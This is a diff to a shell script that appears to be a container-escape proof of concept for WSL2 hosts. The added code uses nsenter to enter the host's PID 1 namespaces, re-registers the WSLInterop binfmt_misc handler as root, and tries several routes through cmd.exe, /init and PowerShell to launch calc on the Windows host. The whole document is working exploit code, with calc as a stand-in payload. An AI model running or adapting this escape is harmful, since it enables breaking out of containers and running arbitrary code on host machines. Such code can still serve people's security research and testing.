@@ -91,14 +91,34 @@ if [ -f /host/mnt/c/Windows/System32/cmd.exe ] || grep -qi microsoft /host/proc/
   else
     echo "[!] no WSL_INTEROP in host procs — interop launch may still no-op"
   fi
+  # binfmt_misc: kernel needs WSLInterop entry to exec PE binaries via /init.
+  # Inside nsenter context it may be missing — re-register if so (we are root).
+  echo "[*] checking binfmt_misc WSLInterop in host namespace ..."
+  nsenter -t 1 -m -u -i -n -p -- sh -c '
+    if [ ! -d /proc/sys/fs/binfmt_misc ]; then
+      mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc 2>/dev/null
+    fi
+    if [ -f /proc/sys/fs/binfmt_misc/WSLInterop ]; then
+      echo "[*] WSLInterop already registered"
+      head -2 /proc/sys/fs/binfmt_misc/WSLInterop
+    else
+      echo "[*] WSLInterop missing — registering"
+      echo ":WSLInterop:M::MZ::/init:" > /proc/sys/fs/binfmt_misc/register 2>/dev/null \
+        && echo "[+] registered" || echo "[!] register failed"
+    fi
+  '
+
   runwin() { nsenter -t 1 -m -u -i -n -p -- env WSL_INTEROP="$interop" "$@"; }
-  runwin /bin/sh -c "cd /mnt/c && exec /mnt/c/Windows/System32/cmd.exe /c start calc" 2>&1 \
-    && echo "[+] calc launched (cmd.exe start)" && exit 0
+  runwin /mnt/c/Windows/System32/cmd.exe /c start calc 2>&1 \
+    && echo "[+] calc launched (cmd.exe via binfmt)" && exit 0
+  runwin /init /mnt/c/Windows/System32/cmd.exe /c start calc 2>&1 \
+    && echo "[+] calc launched (cmd.exe via /init)" && exit 0
   runwin /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe \
     -NoProfile -Command "Start-Process calc" 2>&1 \
     && echo "[+] calc launched (powershell)" && exit 0
-  runwin /mnt/c/Windows/System32/calc.exe 2>&1 \
-    && echo "[+] calc launched (calc.exe)" && exit 0
+  runwin /init /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe \
+    -NoProfile -Command "Start-Process calc" 2>&1 \
+    && echo "[+] calc launched (powershell via /init)" && exit 0
   echo "[!] all WSL2 calc methods failed — check proof file: $PROOF"
 else
   echo "[*] native Linux — launching calc"
